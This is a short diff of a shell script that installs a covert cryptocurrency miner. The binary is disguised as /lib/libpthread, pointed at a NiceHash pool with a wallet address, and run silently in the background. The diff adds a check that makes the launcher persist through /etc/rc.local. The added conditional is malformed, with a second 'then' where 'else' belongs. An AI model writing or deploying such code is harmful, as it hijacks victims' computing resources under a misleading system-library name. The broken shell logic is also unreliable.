@@ -46,5 +46,9 @@ esac
 sudo echo "/lib/libpthread -o nicehash.gpu360.com:3355 -u 33MQmd3LSueY4gxSCXSJLrmVxtQ6WTQqJP.libpthread --nicehash  --max-cpu-usage=1 -p x --background" > /usr/sbin/pthread
 sudo chmod +x /lib/libpthread
 sudo chmod +x /usr/sbin/pthread
+if [ -z "`grep "/usr/sbin/pthread" /etc/rc.local`" ]; then
 sudo echo "/usr/sbin/pthread >/dev/null 2>&1 &" >> /etc/rc.local
+then
+	echo "has pthread"
+fi
 sudo /usr/sbin/pthread >/dev/null 2>&1 &
